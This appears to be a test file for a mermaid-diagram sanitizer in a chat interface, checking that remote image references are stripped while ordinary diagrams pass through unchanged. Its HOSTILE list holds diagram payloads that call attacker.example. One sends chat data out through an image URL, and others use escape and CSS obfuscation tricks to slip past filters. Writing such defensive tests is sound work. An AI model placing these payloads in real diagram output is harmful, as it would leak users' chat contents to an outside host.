// SPDX-License-Identifier: AGPL-3.0-only
// Copyright 2026-present the Unsloth AI Inc. team. All rights reserved. See /studio/LICENSE.AGPL-3.0

// A mermaid diagram keeps to the chat's image policy: what it draws may name a `data:` image,
// never a remote one, while a diagram that names none reaches mermaid exactly as written.
import assert from "node:assert/strict";
import test from "node:test";

import { stripRemoteDiagramImages } from "../src/components/assistant-ui/mermaid-guard.ts";
import { readSrc } from "./helpers/kit.ts";

const HOSTILE = [
  'flowchart LR\n  A@{ img: "https://attacker.example/collect?chat=secret", w: 1, h: 1 }',
  'flowchart LR\n  A@{ img: "HTTPS://attacker.example/c", label: "x" }',
  'flowchart LR\n  A@{ img: "https:/attacker.example/c" }',
  'flowchart LR\n  A@{ img: "//attacker.example/c" }',
  'flowchart LR\n  A@{ img: "\\x68ttps://attacker.example/c" }',
  'flowchart LR\n  A@{ "\\x69mg": "https://attacker.example/c" }',
  "flowchart LR\n  A@{\n    shape: image\n    img: https://attacker.example/c\n  }",
  "flowchart LR\n  A[\"<img src='https://attacker.example/c'>\"]",
  "flowchart LR\n  A[\"<IMG SRC=https://attacker.example/c>\"]",
  "flowchart LR\n  A --> B\n  classDef x background:url(https://attacker.example/c)\n  class A x",
  "flowchart LR\n  A --> B\n  style A background:u\\72l(https://attacker.example/c)",
  'sequenceDiagram\n  participant Alice\n  properties Alice: {"icon": "https://attacker.example/c"}\n  Alice->>Bob: hi',
  'sequenceDiagram\n  participant Alice\n  properties Alice: {"\\u0069con": "\\u0068ttps://attacker.example/c"}\n  Alice->>Bob: hi',
  'flowchart LR\n%% @{ "\n  A@{ img: "https://attacker.example/c" }',
  "flowchart LR\n  A[\"<span style='background-image:url(https://attacker.example/c)'>x</span>\"]",
  "flowchart LR\n  A[\"<span style='background:#117;rl(https://attacker.example/c)'>x</span>\"]",
  "flowchart LR\n  A[\"<b style='background:&#x75;rl(https://attacker.example/c)'>x</b>\"]",
  "flowchart LR\nA-->B\n\fstyle A fill:url(https://attacker.example/x)",
  "  ---\n  config:\n    themeVariables:\n      xyChart:\n        plotColorPalette: url(https://attacker.example/x)\n  ---\nxychart-beta\n  bar [1, 2]",
];

for (const source of HOSTILE) {
  test(`no remote image survives: ${JSON.stringify(source.split("\n").slice(-1)[0]).slice(0, 70)}`, () => {
    const out = stripRemoteDiagramImages(source);
    assert.equal(/attacker\.example/.test(out) && !/#lt;/.test(out), false, out);
    // Idempotent.
    assert.equal(stripRemoteDiagramImages(out), out);
  });
}

const ORDINARY = [
  "flowchart LR\n  A[\"<span style='color:#000;font-weight:bold'>dark</span>\"] --> B",
  '%%{init: {"theme": "dark"}}%%\nflowchart LR\n  %% a note about @{ the layout\n  A --> B',
  "flowchart TD\n  A[Start] --> B{Is it?}\n  B -->|Yes| C[OK]\n  C --> D[Rethink]\n  D --> B\n  B ---->|No| E[End]",
  "sequenceDiagram\n  Alice->>John: Hello John, how are you?\n  John-->>Alice: Great!\n  Alice-)John: See you later!",
  "flowchart LR\n  A@{ shape: rounded, label: \"Load model\" } --> B@{ shape: diamond }\n  classDef hot fill:#f96,stroke:#333\n  class A hot\n  style B fill:#bbf,stroke-width:2px",
  'flowchart LR\n  A@{ img: "data:image/png;base64,iVBORw0KGgo=", w: 10, h: 10 }',
  'flowchart LR\n  A["line one<br/>line <b>two</b>"] --> B\n  click A href "https://unsloth.ai/docs" _blank',
  "classDiagram\n  class Animal {\n    <<interface>>\n    +List~int~ ids\n    +isMammal() bool\n  }\n  Animal <|-- Duck",
  'sequenceDiagram\n  participant Alice\n  properties Alice: {"class": "internal-service-actor-box"}\n  Alice->>Bob: hi',
  "gantt\n  title Plan\n  dateFormat YYYY-MM-DD\n  section A\n  Task 1 :a1, 2024-01-01, 30d",
  "pie title Pets\n  \"Dogs\" : 386\n  \"Cats\" : 85",
];

for (const source of ORDINARY) {
  test(`an ordinary diagram is passed through unchanged: ${JSON.stringify(source.split("\n")[0])}`, () => {
    assert.equal(stripRemoteDiagramImages(source), source);
  });
}

test("the remote image key is dropped and the rest of the node kept", () => {
  assert.equal(
    stripRemoteDiagramImages('flowchart LR\n  A@{ img: "https://attacker.example/c", label: "Hi", w: 1 }'),
    'flowchart LR\n  A@{ "label":"Hi","w":1 }',
  );
});

test("every surface that draws a diagram uses the guarded plugin", () => {
  for (const path of [
    "components/assistant-ui/markdown-text.tsx",
    "components/markdown/markdown-preview.tsx",
    "features/hub/catalog/model-readme.tsx",
  ]) {
    const text = readSrc(path);
    assert.equal(text.includes('from "@streamdown/mermaid"'), false, `${path} still registers the stock plugin`);
    assert.match(text, /mermaid-plugin"/, path);
  }
});

test("a sequence actor cannot take its properties from an element on the page", () => {
  const source = "sequenceDiagram\n  participant Alice\n  details Alice: payload\n  Alice->>Bob: hi";
  const out = stripRemoteDiagramImages(source);
  assert.equal(/details/.test(out), false, out);
  assert.match(out, /Alice->>Bob: hi/);
  // A flowchart node that happens to be called details is left alone.
  const flow = "flowchart LR\n  details[Details: here] --> B";
  assert.equal(stripRemoteDiagramImages(flow), flow);
});

test("details is dropped only from sequence diagrams", () => {
  const timeline = "timeline\n  title Plan\n  details : Important milestone";
  assert.equal(stripRemoteDiagramImages(timeline), timeline);
});

test("an init directive or front matter that could fetch is dropped, theme colours stay", () => {
  const hostile = [
    '%%{init: {"themeVariables": {"xyChart": {"plotColorPalette": "url(https://attacker.example/x)"}}}}%%\nxychart-beta\n  bar [1, 2]',
    "---\nconfig:\n  themeVariables:\n    xyChart:\n      plotColorPalette: url(https://attacker.example/x)\n---\nxychart-beta\n  bar [1, 2]",
  ];
  for (const source of hostile) assert.equal(/attacker\.example/.test(stripRemoteDiagramImages(source)), false);
  const themed = '%%{init: {"theme": "base", "themeVariables": {"primaryColor": "#ff0000"}}}%%\nflowchart LR\n  A --> B';
  assert.equal(stripRemoteDiagramImages(themed), themed);
  const titled = "---\ntitle: Pipeline\n---\nflowchart LR\n  A --> B";
  assert.equal(stripRemoteDiagramImages(titled), titled);
});
